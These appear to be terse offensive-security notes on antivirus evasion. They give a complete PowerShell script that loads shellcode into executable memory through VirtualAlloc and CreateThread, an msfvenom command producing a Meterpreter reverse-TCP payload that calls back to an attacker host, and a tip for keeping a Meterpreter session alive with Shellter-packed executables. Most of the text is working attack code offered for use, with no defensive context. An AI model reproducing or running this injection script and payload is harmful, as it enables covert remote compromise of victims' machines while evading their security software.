We will focus on two types of AV Evasion

POWERSHELL MEMORY INJECTION:

Make sure the execution policy is set to unrestricted
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
THEN MAKE THE FOLLOWING POWERSHELL SCRIPT

$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc =
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
  
[Byte[]];
[Byte[]]$sc = <SHELLCODE GOES HERE>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le  ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc [$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };



AND GENERATE THE SHELLCODE WITH

msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP.ADD.HE.RE LPORT=3377 -f powershell




>SHELLTER:<<<<<

SHELTER IS PRETTY STRAIGHT FORWARD, ITS EASIEST TO SHOOT FOR METERPRETER REVERSE TCP AND USE
set AutoRunScript post/windows/manage/migrate
BEFORE RUNNING YOUR HANDLER SO THAT YOU DONT LOSE YOUR SESSION WHENEVER THE EXE IS CLOSED
